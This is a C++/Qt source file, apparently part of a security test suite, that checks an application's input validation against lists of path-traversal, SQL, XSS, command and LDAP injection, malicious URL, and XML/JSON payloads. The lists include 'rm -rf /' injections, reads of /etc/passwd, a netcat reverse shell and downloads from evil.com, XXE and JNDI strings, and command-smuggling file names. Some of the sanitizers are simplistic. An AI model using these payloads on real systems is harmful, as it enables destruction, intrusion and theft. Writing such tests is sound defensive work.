#include "input_validation_testing.h"
#include <QDebug>
#include <QCoreApplication>
#include <QStandardPaths>
#include <QJsonParseError>
#include <QXmlStreamReader>
#include <QUrlQuery>

// Static pattern definitions
const QStringList InputValidationTesting::PATH_TRAVERSAL_PATTERNS = {
    "../",
    "..\\",
    "....//",
    "....\\\\",
    "%2e%2e%2f",
    "%2e%2e%5c",
    "..%252f",
    "..%255c",
    "%c0%ae%c0%ae%c0%af",
    "%c1%9c",
    "\\..\\",
    "/..",
    "\\\\..\\\\",
    "//../../",
    "/./../../",
    "\\.\\..\\..\\",
    "file:///etc/passwd",
    "file://c:/windows/system32/config/sam",
    "..%2f",
    "..%5c",
    "%2e%2e/",
    "%2e%2e\\",
    "..%u002f",
    "..%u005c"
};

const QStringList InputValidationTesting::SQL_INJECTION_PATTERNS = {
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DELETE FROM files; --",
    "' UNION SELECT * FROM passwords --",
    "admin'--",
    "admin'/*",
    "' OR 'x'='x",
    "'; EXEC xp_cmdshell('dir'); --",
    "' AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
    "1'; WAITFOR DELAY '00:00:05'; --",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
    "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
    "' OR SUBSTRING(@@version,1,1) = '5' --"
};

const QStringList InputValidationTesting::XSS_PATTERNS = {
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "</script><script>alert('XSS')</script>",
    "<script src=data:text/javascript,alert('XSS')></script>"
};

const QStringList InputValidationTesting::COMMAND_INJECTION_PATTERNS = {
    "; rm -rf /",
    "| rm -rf /",
    "&& rm -rf /",
    "|| rm -rf /",
    "`rm -rf /`",
    "$(rm -rf /)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; wget http://evil.com/malware",
    "| curl http://evil.com/malware",
    "&& nc -e /bin/sh evil.com 4444",
    "; python -c \"import os; os.system('rm -rf /')\"",
    "| perl -e \"system('rm -rf /')\""
};

const QStringList InputValidationTesting::LDAP_INJECTION_PATTERNS = {
    "*)(uid=*",
    "*)(|(uid=*",
    "*)(&(uid=*",
    "*))%00",
    "admin)(&(password=*))",
    "*)(cn=*)",
    "*)(objectClass=*)",
    "*))(|(cn=*",
    "*)(|(objectClass=*)(cn=*",
    "admin*",
    "*)(userPassword=*)",
    "*)(mail=*@*)",
    "*)(|(cn=admin)(cn=*",
    "*)(description=*)"
};

const QStringList InputValidationTesting::MALICIOUS_FILE_NAMES = {
    "con.txt",
    "prn.txt",
    "aux.txt",
    "nul.txt",
    "com1.txt",
    "com2.txt",
    "com3.txt",
    "lpt1.txt",
    "lpt2.txt",
    "file<script>alert('xss')</script>.txt",
    "file\x00hidden.txt",
    "file\r\nhidden.txt",
    "file|rm -rf /.txt",
    "file;rm -rf /.txt",
    "file`rm -rf /`.txt",
    "file$(rm -rf /).txt",
    QString(300, 'a') + ".txt", // Very long filename
    ".hidden_system_file",
    "~backup_file.txt",
    "file with\ttab.txt",
    "file with\nnewline.txt",
    "file:with:colons.txt",
    "file*with*wildcards.txt",
    "file?with?questions.txt",
    "file\"with\"quotes.txt",
    "file<with>brackets.txt",
    "file|with|pipes.txt"
};

const QStringList InputValidationTesting::MALICIOUS_URLS = {
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
    "vbscript:msgbox('XSS')",
    "file:///etc/passwd",
    "file://c:/windows/system32/config/sam",
    "ftp://anonymous:password@evil.com/",
    "http://evil.com/malware.exe",
    "https://phishing-site.com/login",
    "ldap://evil.com/malicious",
    "gopher://evil.com:70/malicious",
    "telnet://evil.com:23/",
    "ssh://evil.com:22/",
    "http://127.0.0.1:22/",
    "http://localhost:3389/",
    "http://[::1]:22/",
    "http://0x7f000001/",
    "http://2130706433/",
    "http://017700000001/"
};

const QStringList InputValidationTesting::RESERVED_WINDOWS_NAMES = {
    "CON", "PRN", "AUX", "NUL",
    "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
    "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9"
};

const QStringList InputValidationTesting::DANGEROUS_FILE_EXTENSIONS = {
    ".exe", ".bat", ".cmd", ".com", ".pif", ".scr", ".vbs", ".js", ".jar",
    ".app", ".deb", ".pkg", ".dmg", ".run", ".bin", ".sh", ".ps1", ".msi"
};

InputValidationTesting::InputValidationTesting(QObject* parent)
    : QObject(parent)
{
    // Initialize default configuration
    m_config.enablePathTraversalTests = true;
    m_config.enableInjectionTests = true;
    m_config.enableFileNameTests = true;
    m_config.enableConfigTests = true;
    m_config.enableURLTests = true;
    m_config.enableDataFormatTests = true;
    m_config.enableEncodingTests = true;
    m_config.enableLengthTests = true;
    
    m_config.maxFileNameLength = 255;
    m_config.maxPathLength = 4096;
    m_config.maxConfigValueLength = 1024;
    
    m_config.allowedFileExtensions = {".txt", ".jpg", ".png", ".pdf", ".doc", ".docx", ".zip"};
    m_config.blockedFileExtensions = DANGEROUS_FILE_EXTENSIONS;
    m_config.allowedProtocols = {"http", "https", "ftp", "file"};
    
    // Register metatypes
    qRegisterMetaType<ValidationCategory>("ValidationCategory");
    qRegisterMetaType<ValidationResult>("ValidationResult");
    qRegisterMetaType<ValidationConfig>("ValidationConfig");
}

InputValidationTesting::~InputValidationTesting()
{
}

void InputValidationTesting::setValidationConfig(const ValidationConfig& config)
{
    m_config = config;
}

InputValidationTesting::ValidationConfig InputValidationTesting::validationConfig() const
{
    return m_config;
}

QList<InputValidationTesting::ValidationResult> InputValidationTesting::runAllValidationTests()
{
    qDebug() << "Starting comprehensive input validation testing...";
    
    m_results.clear();
    
    if (m_config.enablePathTraversalTests) {
        m_results << runPathTraversalTests();
    }
    
    if (m_config.enableInjectionTests) {
        m_results << runInjectionTests();
    }
    
    if (m_config.enableFileNameTests) {
        m_results << runFileNameTests();
    }
    
    if (m_config.enableConfigTests) {
        m_results << runConfigurationTests();
    }
    
    if (m_config.enableURLTests) {
        m_results << runURLValidationTests();
    }
    
    if (m_config.enableDataFormatTests) {
        m_results << runDataFormatTests();
    }
    
    qDebug() << "Input validation testing completed. Total tests:" << m_results.size();
    
    // Generate summary
    int passed = 0, failed = 0;
    for (const auto& result : m_results) {
        if (result.inputBlocked || result.sanitizationCorrect) {
            passed++;
        } else {
            failed++;
        }
    }
    
    qDebug() << "Validation Summary - Passed:" << passed << "Failed:" << failed;
    
    return m_results;
}

QList<InputValidationTesting::ValidationResult> InputValidationTesting::runPathTraversalTests()
{
    qDebug() << "\n=== Path Traversal Validation Tests ===";
    
    QList<ValidationResult> results;
    
    for (const QString& payload : PATH_TRAVERSAL_PATTERNS) {
        ValidationResult result = validatePathTraversal(payload);
        results << result;
        emit validationTestCompleted(result);
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(payload, "Path Traversal");
        }
    }
    
    // Test legitimate paths
    QStringList legitimatePaths = {
        "documents/file.txt",
        "images/photo.jpg",
        "data/backup.zip",
        "config/settings.json",
        "reports/2023/annual.pdf"
    };
    
    for (const QString& path : legitimatePaths) {
        ValidationResult result = validatePathTraversal(path);
        result.testName = "Legitimate Path Test";
        results << result;
        
        // Legitimate paths should NOT be blocked
        if (result.inputBlocked) {
            result.errorMessage = "Legitimate path was incorrectly blocked";
        }
    }
    
    return results;
}

QList<InputValidationTesting::ValidationResult> InputValidationTesting::runInjectionTests()
{
    qDebug() << "\n=== Injection Attack Validation Tests ===";
    
    QList<ValidationResult> results;
    
    // SQL Injection tests
    for (const QString& payload : SQL_INJECTION_PATTERNS) {
        ValidationResult result = validateSQLInjection(payload);
        results << result;
        emit validationTestCompleted(result);
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(payload, "SQL Injection");
        }
    }
    
    // XSS tests
    for (const QString& payload : XSS_PATTERNS) {
        ValidationResult result = validateXSSInjection(payload);
        results << result;
        emit validationTestCompleted(result);
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(payload, "XSS Injection");
        }
    }
    
    // Command Injection tests
    for (const QString& payload : COMMAND_INJECTION_PATTERNS) {
        ValidationResult result = validateCommandInjection(payload);
        results << result;
        emit validationTestCompleted(result);
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(payload, "Command Injection");
        }
    }
    
    // LDAP Injection tests
    for (const QString& payload : LDAP_INJECTION_PATTERNS) {
        ValidationResult result = validateLDAPInjection(payload);
        results << result;
        emit validationTestCompleted(result);
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(payload, "LDAP Injection");
        }
    }
    
    return results;
}

QList<InputValidationTesting::ValidationResult> InputValidationTesting::runFileNameTests()
{
    qDebug() << "\n=== File Name Validation Tests ===";
    
    QList<ValidationResult> results;
    
    // Test malicious file names
    for (const QString& fileName : MALICIOUS_FILE_NAMES) {
        ValidationResult result = validateFileName(fileName);
        results << result;
        emit validationTestCompleted(result);
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(fileName, "Malicious File Name");
        }
    }
    
    // Test reserved Windows names
    for (const QString& reservedName : RESERVED_WINDOWS_NAMES) {
        QString testName = reservedName.toLower() + ".txt";
        ValidationResult result = validateFileName(testName);
        result.testName = "Reserved Windows Name Test";
        results << result;
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(testName, "Reserved Windows Name");
        }
    }
    
    // Test dangerous extensions
    for (const QString& extension : DANGEROUS_FILE_EXTENSIONS) {
        QString testName = "malicious" + extension;
        ValidationResult result = validateFileName(testName);
        result.testName = "Dangerous Extension Test";
        results << result;
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(testName, "Dangerous File Extension");
        }
    }
    
    // Test legitimate file names
    QStringList legitimateNames = {
        "document.txt",
        "image_001.jpg",
        "data-file.csv",
        "backup_2023-10-18.zip",
        "report_final_v2.pdf"
    };
    
    for (const QString& fileName : legitimateNames) {
        ValidationResult result = validateFileName(fileName);
        result.testName = "Legitimate File Name Test";
        results << result;
        
        // Legitimate names should NOT be blocked
        if (result.inputBlocked) {
            result.errorMessage = "Legitimate file name was incorrectly blocked";
        }
    }
    
    return results;
}

QList<InputValidationTesting::ValidationResult> InputValidationTesting::runConfigurationTests()
{
    qDebug() << "\n=== Configuration Validation Tests ===";
    
    QList<ValidationResult> results;
    
    // Test malicious configuration values
    QStringList maliciousConfigs = {
        "../../../etc/passwd",
        "'; DROP TABLE config; --",
        "<script>alert('xss')</script>",
        "$(rm -rf /)",
        "${jndi:ldap://evil.com/a}",
        "file:///etc/passwd",
        QString(2000, 'A'), // Very long value
        "value\x00hidden",
        "value\r\nhidden"
    };
    
    for (const QString& value : maliciousConfigs) {
        ValidationResult result = validateConfigurationValue("test_key", value);
        results << result;
        emit validationTestCompleted(result);
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(value, "Malicious Configuration");
        }
    }
    
    // Test legitimate configuration values
    QStringList legitimateConfigs = {
        "/safe/backup/path",
        "1048576",
        "true",
        "false",
        "admin@example.com",
        "192.168.1.1",
        "https://example.com/api"
    };
    
    for (const QString& value : legitimateConfigs) {
        ValidationResult result = validateConfigurationValue("test_key", value);
        result.testName = "Legitimate Configuration Test";
        results << result;
        
        // Legitimate configs should NOT be blocked
        if (result.inputBlocked) {
            result.errorMessage = "Legitimate configuration was incorrectly blocked";
        }
    }
    
    return results;
}

QList<InputValidationTesting::ValidationResult> InputValidationTesting::runURLValidationTests()
{
    qDebug() << "\n=== URL Validation Tests ===";
    
    QList<ValidationResult> results;
    
    // Test malicious URLs
    for (const QString& url : MALICIOUS_URLS) {
        ValidationResult result = validateURL(url);
        results << result;
        emit validationTestCompleted(result);
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(url, "Malicious URL");
        }
    }
    
    // Test legitimate URLs
    QStringList legitimateURLs = {
        "https://example.com",
        "http://localhost:8080",
        "ftp://ftp.example.com/file.zip",
        "file:///home/user/document.txt",
        "https://api.example.com/v1/data?param=value"
    };
    
    for (const QString& url : legitimateURLs) {
        ValidationResult result = validateURL(url);
        result.testName = "Legitimate URL Test";
        results << result;
        
        // Check if URL is in allowed protocols
        QUrl qurl(url);
        if (m_config.allowedProtocols.contains(qurl.scheme().toLower())) {
            // Should NOT be blocked
            if (result.inputBlocked) {
                result.errorMessage = "Legitimate URL was incorrectly blocked";
            }
        }
    }
    
    return results;
}

QList<InputValidationTesting::ValidationResult> InputValidationTesting::runDataFormatTests()
{
    qDebug() << "\n=== Data Format Validation Tests ===";
    
    QList<ValidationResult> results;
    
    // Test malicious JSON payloads
    QStringList maliciousJSON = {
        "{\"key\": \"<script>alert('xss')</script>\"}",
        "{\"path\": \"../../../etc/passwd\"}",
        "{\"command\": \"rm -rf /\"}",
        "{\"injection\": \"'; DROP TABLE users; --\"}",
        "{\"" + QString(1000, 'A') + "\": \"value\"}",
        "{\"key\": \"" + QString(10000, 'B') + "\"}"
    };
    
    for (const QString& json : maliciousJSON) {
        ValidationResult result = validateJSONData(json);
        results << result;
        emit validationTestCompleted(result);
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(json, "Malicious JSON");
        }
    }
    
    // Test malicious XML payloads
    QStringList maliciousXML = {
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<root><script>alert('xss')</script></root>",
        "<root path=\"../../../etc/passwd\">content</root>",
        "<root>" + QString(50000, 'X') + "</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><root>&lol2;</root>"
    };
    
    for (const QString& xml : maliciousXML) {
        ValidationResult result = validateXMLData(xml);
        results << result;
        emit validationTestCompleted(result);
        
        if (!result.inputBlocked) {
            emit maliciousInputDetected(xml, "Malicious XML");
        }
    }
    
    // Test legitimate data formats
    QString legitimateJSON = "{\"name\": \"test\", \"value\": 123, \"enabled\": true}";
    ValidationResult jsonResult = validateJSONData(legitimateJSON);
    jsonResult.testName = "Legitimate JSON Test";
    results << jsonResult;
    
    QString legitimateXML = "<?xml version=\"1.0\"?><root><item>value</item></root>";
    ValidationResult xmlResult = validateXMLData(legitimateXML);
    xmlResult.testName = "Legitimate XML Test";
    results << xmlResult;
    
    return results;
}

// Individual validation method implementations
InputValidationTesting::ValidationResult InputValidationTesting::validatePathTraversal(const QString& input)
{
    ValidationResult result;
    result.testName = "Path Traversal Validation";
    result.category = ValidationCategory::PathTraversal;
    result.input = input;
    
    emit validationTestStarted(result.testName, result.category);
    
    // Check for path traversal patterns
    result.inputBlocked = testPathTraversalPrevention(input);
    
    // Sanitize the input
    result.sanitizedOutput = sanitizeFilePath(input);
    
    // Check if sanitization was correct
    result.sanitizationCorrect = validateSanitization(input, result.sanitizedOutput, ValidationCategory::PathTraversal);
    
    if (!result.inputBlocked && containsPathTraversal(input)) {
        result.errorMessage = "Path traversal attack not blocked";
    }
    
    return result;
}

InputValidationTesting::ValidationResult InputValidationTesting::validateSQLInjection(const QString& input)
{
    ValidationResult result;
    result.testName = "SQL Injection Validation";
    result.category = ValidationCategory::InjectionAttacks;
    result.input = input;
    
    emit validationTestStarted(result.testName, result.category);
    
    result.inputBlocked = testInjectionPrevention(input, "SQL");
    result.sanitizedOutput = sanitizeForSQL(input);
    result.sanitizationCorrect = validateSanitization(input, result.sanitizedOutput, ValidationCategory::InjectionAttacks);
    
    if (!result.inputBlocked && matchesSQLInjectionPattern(input)) {
        result.errorMessage = "SQL injection attack not blocked";
    }
    
    return result;
}

InputValidationTesting::ValidationResult InputValidationTesting::validateXSSInjection(const QString& input)
{
    ValidationResult result;
    result.testName = "XSS Injection Validation";
    result.category = ValidationCategory::InjectionAttacks;
    result.input = input;
    
    emit validationTestStarted(result.testName, result.category);
    
    result.inputBlocked = testInjectionPrevention(input, "XSS");
    result.sanitizedOutput = sanitizeForHTML(input);
    result.sanitizationCorrect = validateSanitization(input, result.sanitizedOutput, ValidationCategory::InjectionAttacks);
    
    if (!result.inputBlocked && matchesXSSPattern(input)) {
        result.errorMessage = "XSS injection attack not blocked";
    }
    
    return result;
}

InputValidationTesting::ValidationResult InputValidationTesting::validateCommandInjection(const QString& input)
{
    ValidationResult result;
    result.testName = "Command Injection Validation";
    result.category = ValidationCategory::InjectionAttacks;
    result.input = input;
    
    emit validationTestStarted(result.testName, result.category);
    
    result.inputBlocked = testInjectionPrevention(input, "Command");
    result.sanitizedOutput = sanitizeForShell(input);
    result.sanitizationCorrect = validateSanitization(input, result.sanitizedOutput, ValidationCategory::InjectionAttacks);
    
    if (!result.inputBlocked && matchesCommandInjectionPattern(input)) {
        result.errorMessage = "Command injection attack not blocked";
    }
    
    return result;
}

InputValidationTesting::ValidationResult InputValidationTesting::validateLDAPInjection(const QString& input)
{
    ValidationResult result;
    result.testName = "LDAP Injection Validation";
    result.category = ValidationCategory::InjectionAttacks;
    result.input = input;
    
    emit validationTestStarted(result.testName, result.category);
    
    result.inputBlocked = testInjectionPrevention(input, "LDAP");
    result.sanitizedOutput = input; // Basic sanitization for LDAP
    result.sanitizedOutput.remove(QRegularExpression("[*()&|!]"));
    result.sanitizationCorrect = validateSanitization(input, result.sanitizedOutput, ValidationCategory::InjectionAttacks);
    
    if (!result.inputBlocked && matchesLDAPInjectionPattern(input)) {
        result.errorMessage = "LDAP injection attack not blocked";
    }
    
    return result;
}

InputValidationTesting::ValidationResult InputValidationTesting::validateFileName(const QString& input)
{
    ValidationResult result;
    result.testName = "File Name Validation";
    result.category = ValidationCategory::FileNameValidation;
    result.input = input;
    
    emit validationTestStarted(result.testName, result.category);
    
    result.inputBlocked = !testFileNameSecurity(input);
    result.sanitizedOutput = sanitizeFileName(input);
    result.sanitizationCorrect = validateSanitization(input, result.sanitizedOutput, ValidationCategory::FileNameValidation);
    
    if (!result.inputBlocked && !isValidFileName(input)) {
        result.errorMessage = "Invalid file name not blocked";
    }
    
    return result;
}

InputValidationTesting::ValidationResult InputValidationTesting::validateFilePath(const QString& input)
{
    ValidationResult result;
    result.testName = "File Path Validation";
    result.category = ValidationCategory::PathTraversal;
    result.input = input;
    
    emit validationTestStarted(result.testName, result.category);
    
    result.inputBlocked = !isValidFilePath(input);
    result.sanitizedOutput = sanitizeFilePath(input);
    result.sanitizationCorrect = validateSanitization(input, result.sanitizedOutput, ValidationCategory::PathTraversal);
    
    return result;
}

InputValidationTesting::ValidationResult InputValidationTesting::validateConfigurationValue(const QString& key, const QString& value)
{
    ValidationResult result;
    result.testName = "Configuration Value Validation";
    result.category = ValidationCategory::ConfigurationSecurity;
    result.input = value;
    
    emit validationTestStarted(result.testName, result.category);
    
    result.inputBlocked = !testConfigurationSecurity(key, value);
    result.sanitizedOutput = sanitizeConfigValue(value);
    result.sanitizationCorrect = validateSanitization(value, result.sanitizedOutput, ValidationCategory::ConfigurationSecurity);
    
    return result;
}

InputValidationTesting::ValidationResult InputValidationTesting::validateURL(const QString& input)
{
    ValidationResult result;
    result.testName = "URL Validation";
    result.category = ValidationCategory::URLValidation;
    result.input = input;
    
    emit validationTestStarted(result.testName, result.category);
    
    result.inputBlocked = !testURLSecurity(input);
    result.sanitizedOutput = sanitizeURL(input);
    result.sanitizationCorrect = validateSanitization(input, result.sanitizedOutput, ValidationCategory::URLValidation);
    
    if (!result.inputBlocked && !isValidURL(input)) {
        result.errorMessage = "Invalid URL not blocked";
    }
    
    return result;
}

InputValidationTesting::ValidationResult InputValidationTesting::validateJSONData(const QString& input)
{
    ValidationResult result;
    result.testName = "JSON Data Validation";
    result.category = ValidationCategory::DataFormatValidation;
    result.input = input;
    
    emit validationTestStarted(result.testName, result.category);
    
    result.inputBlocked = !testDataFormatSecurity(input, "JSON");
    result.sanitizedOutput = input; // JSON sanitization would be format-specific
    result.sanitizationCorrect = isValidJSON(result.sanitizedOutput);
    
    return result;
}

InputValidationTesting::ValidationResult InputValidationTesting::validateXMLData(const QString& input)
{
    ValidationResult result;
    result.testName = "XML Data Validation";
    result.category = ValidationCategory::DataFormatValidation;
    result.input = input;
    
    emit validationTestStarted(result.testName, result.category);
    
    result.inputBlocked = !testDataFormatSecurity(input, "XML");
    result.sanitizedOutput = input; // XML sanitization would be format-specific
    result.sanitizationCorrect = isValidXML(result.sanitizedOutput);
    
    return result;
}

// Static sanitization methods
QString InputValidationTesting::sanitizeFileName(const QString& fileName)
{
    QString sanitized = fileName;
    
    // Remove dangerous characters
    sanitized.remove(QRegularExpression("[<>:\"|?*\\x00-\\x1f]"));
    
    // Remove path separators
    sanitized.remove('/');
    sanitized.remove('\\');
    
    // Limit length
    if (sanitized.length() > 255) {
        sanitized = sanitized.left(252) + "...";
    }
    
    // Check for reserved names
    QString baseName = QFileInfo(sanitized).baseName().toUpper();
    if (RESERVED_WINDOWS_NAMES.contains(baseName)) {
        sanitized = "safe_" + sanitized;
    }
    
    return sanitized;
}

QString InputValidationTesting::sanitizeFilePath(const QString& filePath)
{
    QString sanitized = filePath;
    
    // Remove path traversal patterns
    sanitized.remove(QRegularExpression("\\.\\./"));
    sanitized.remove(QRegularExpression("\\.\\.\\\\"));
    
    // Remove dangerous characters
    sanitized.remove(QRegularExpression("[<>:\"|?*\\x00-\\x1f]"));
    
    // Normalize path separators
    sanitized.replace('\\', '/');
    
    // Remove multiple consecutive slashes
    sanitized.replace(QRegularExpression("/+"), "/");
    
    return sanitized;
}

QString InputValidationTesting::sanitizeConfigValue(const QString& value)
{
    QString sanitized = value;
    
    // Remove script tags and dangerous patterns
    sanitized.remove(QRegularExpression("<script[^>]*>.*</script>", QRegularExpression::CaseInsensitiveOption));
    sanitized.remove(QRegularExpression("javascript:", QRegularExpression::CaseInsensitiveOption));
    sanitized.remove(QRegularExpression("vbscript:", QRegularExpression::CaseInsensitiveOption));
    
    // Remove SQL injection patterns
    sanitized.remove(QRegularExpression("';.*--", QRegularExpression::CaseInsensitiveOption));
    sanitized.remove(QRegularExpression("'.*OR.*'.*'", QRegularExpression::CaseInsensitiveOption));
    
    // Remove command injection patterns
    sanitized.remove(QRegularExpression("[;&|`$()]"));
    
    // Remove path traversal
    sanitized.remove(QRegularExpression("\\.\\./"));
    sanitized.remove(QRegularExpression("\\.\\.\\\\"));
    
    // Limit length
    if (sanitized.length() > 1024) {
        sanitized = sanitized.left(1021) + "...";
    }
    
    return sanitized;
}

QString InputValidationTesting::sanitizeURL(const QString& url)
{
    QUrl qurl(url);
    
    // Only allow specific schemes
    QStringList allowedSchemes = {"http", "https", "ftp", "file"};
    if (!allowedSchemes.contains(qurl.scheme().toLower())) {
        return QString(); // Block dangerous schemes
    }
    
    // Remove dangerous characters from URL components
    QString sanitized = qurl.toString();
    sanitized.remove(QRegularExpression("<script[^>]*>.*</script>", QRegularExpression::CaseInsensitiveOption));
    sanitized.remove(QRegularExpression("javascript:", QRegularExpression::CaseInsensitiveOption));
    sanitized.remove(QRegularExpression("vbscript:", QRegularExpression::CaseInsensitiveOption));
    
    return sanitized;
}

QString InputValidationTesting::sanitizeForHTML(const QString& input)
{
    QString sanitized = input;
    
    // Escape HTML entities
    sanitized.replace('&', "&amp;");
    sanitized.replace('<', "&lt;");
    sanitized.replace('>', "&gt;");
    sanitized.replace('"', "&quot;");
    sanitized.replace('\'', "&#x27;");
    
    return sanitized;
}

QString InputValidationTesting::sanitizeForSQL(const QString& input)
{
    QString sanitized = input;
    
    // Escape single quotes
    sanitized.replace('\'', "''");
    
    // Remove dangerous SQL keywords and patterns
    sanitized.remove(QRegularExpression("\\b(DROP|DELETE|INSERT|UPDATE|EXEC|UNION|SELECT)\\b", QRegularExpression::CaseInsensitiveOption));
    sanitized.remove(QRegularExpression("--;"));
    sanitized.remove(QRegularExpression("/\\*.*\\*/"));
    
    return sanitized;
}

QString InputValidationTesting::sanitizeForShell(const QString& input)
{
    QString sanitized = input;
    
    // Remove dangerous shell characters
    sanitized.remove(QRegularExpression("[;&|`$(){}\\[\\]<>]"));
    
    // Remove command separators
    sanitized.remove("&&");
    sanitized.remove("||");
    
    return sanitized;
}

// Static validation utility methods
bool InputValidationTesting::isValidFileName(const QString& fileName)
{
    // Check length
    if (fileName.isEmpty() || fileName.length() > 255) {
        return false;
    }
    
    // Check for dangerous characters
    if (fileName.contains(QRegularExpression("[<>:\"|?*\\x00-\\x1f]"))) {
        return false;
    }
    
    // Check for path separators
    if (fileName.contains('/') || fileName.contains('\\')) {
        return false;
    }
    
    // Check for reserved names
    QString baseName = QFileInfo(fileName).baseName().toUpper();
    if (RESERVED_WINDOWS_NAMES.contains(baseName)) {
        return false;
    }
    
    return true;
}

bool InputValidationTesting::isValidFilePath(const QString& filePath)
{
    // Check for path traversal
    if (containsPathTraversal(filePath)) {
        return false;
    }
    
    // Check length
    if (filePath.length() > 4096) {
        return false;
    }
    
    // Check each component
    QStringList components = filePath.split('/', Qt::SkipEmptyParts);
    for (const QString& component : components) {
        if (!isValidFileName(component)) {
            return false;
        }
    }
    
    return true;
}

bool InputValidationTesting::containsPathTraversal(const QString& input)
{
    for (const QString& pattern : PATH_TRAVERSAL_PATTERNS) {
        if (input.contains(pattern, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}

bool InputValidationTesting::containsInjectionPattern(const QString& input)
{
    // Check for various injection patterns
    return matchesSQLInjectionPattern(input) ||
           matchesXSSPattern(input) ||
           matchesCommandInjectionPattern(input) ||
           matchesLDAPInjectionPattern(input);
}

bool InputValidationTesting::isValidURL(const QString& url)
{
    QUrl qurl(url);
    
    if (!qurl.isValid()) {
        return false;
    }
    
    // Check scheme
    QString scheme = qurl.scheme().toLower();
    QStringList allowedSchemes = {"http", "https", "ftp", "file"};
    if (!allowedSchemes.contains(scheme)) {
        return false;
    }
    
    // Check for dangerous patterns
    if (url.contains("javascript:", Qt::CaseInsensitive) ||
        url.contains("vbscript:", Qt::CaseInsensitive) ||
        url.contains("<script>", Qt::CaseInsensitive)) {
        return false;
    }
    
    return true;
}

bool InputValidationTesting::isValidJSON(const QString& json)
{
    QJsonParseError error;
    QJsonDocument::fromJson(json.toUtf8(), &error);
    return error.error == QJsonParseError::NoError;
}

bool InputValidationTesting::isValidXML(const QString& xml)
{
    QXmlStreamReader reader(xml);
    
    while (!reader.atEnd()) {
        reader.readNext();
        if (reader.hasError()) {
            return false;
        }
    }
    
    return true;
}

// Test data generation methods
QStringList InputValidationTesting::generatePathTraversalPayloads()
{
    return PATH_TRAVERSAL_PATTERNS;
}

QStringList InputValidationTesting::generateSQLInjectionPayloads()
{
    return SQL_INJECTION_PATTERNS;
}

QStringList InputValidationTesting::generateXSSPayloads()
{
    return XSS_PATTERNS;
}

QStringList InputValidationTesting::generateCommandInjectionPayloads()
{
    return COMMAND_INJECTION_PATTERNS;
}

QStringList InputValidationTesting::generateLDAPInjectionPayloads()
{
    return LDAP_INJECTION_PATTERNS;
}

QStringList InputValidationTesting::generateMaliciousFileNames()
{
    return MALICIOUS_FILE_NAMES;
}

QStringList InputValidationTesting::generateMaliciousURLs()
{
    return MALICIOUS_URLS;
}

QStringList InputValidationTesting::generateMaliciousJSONPayloads()
{
    return {
        "{\"key\": \"<script>alert('xss')</script>\"}",
        "{\"path\": \"../../../etc/passwd\"}",
        "{\"command\": \"rm -rf /\"}",
        "{\"injection\": \"'; DROP TABLE users; --\"}"
    };
}

QStringList InputValidationTesting::generateMaliciousXMLPayloads()
{
    return {
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<root><script>alert('xss')</script></root>",
        "<root path=\"../../../etc/passwd\">content</root>"
    };
}

// Private helper method implementations
bool InputValidationTesting::testPathTraversalPrevention(const QString& input)
{
    return !containsPathTraversal(input);
}

bool InputValidationTesting::testInjectionPrevention(const QString& input, const QString& injectionType)
{
    if (injectionType == "SQL") {
        return !matchesSQLInjectionPattern(input);
    } else if (injectionType == "XSS") {
        return !matchesXSSPattern(input);
    } else if (injectionType == "Command") {
        return !matchesCommandInjectionPattern(input);
    } else if (injectionType == "LDAP") {
        return !matchesLDAPInjectionPattern(input);
    }
    
    return false;
}

bool InputValidationTesting::testFileNameSecurity(const QString& fileName)
{
    return isValidFileName(fileName);
}

bool InputValidationTesting::testConfigurationSecurity(const QString& key, const QString& value)
{
    Q_UNUSED(key)
    
    // Check for dangerous patterns in configuration values
    if (containsPathTraversal(value) ||
        containsInjectionPattern(value) ||
        value.length() > m_config.maxConfigValueLength) {
        return false;
    }
    
    return true;
}

bool InputValidationTesting::testURLSecurity(const QString& url)
{
    return isValidURL(url);
}

bool InputValidationTesting::testDataFormatSecurity(const QString& data, const QString& format)
{
    if (format == "JSON") {
        // Check for XXE, injection patterns, and size limits
        if (data.contains("<!ENTITY", Qt::CaseInsensitive) ||
            containsInjectionPattern(data) ||
            data.length() > 100000) { // 100KB limit
            return false;
        }
        return isValidJSON(data);
    } else if (format == "XML") {
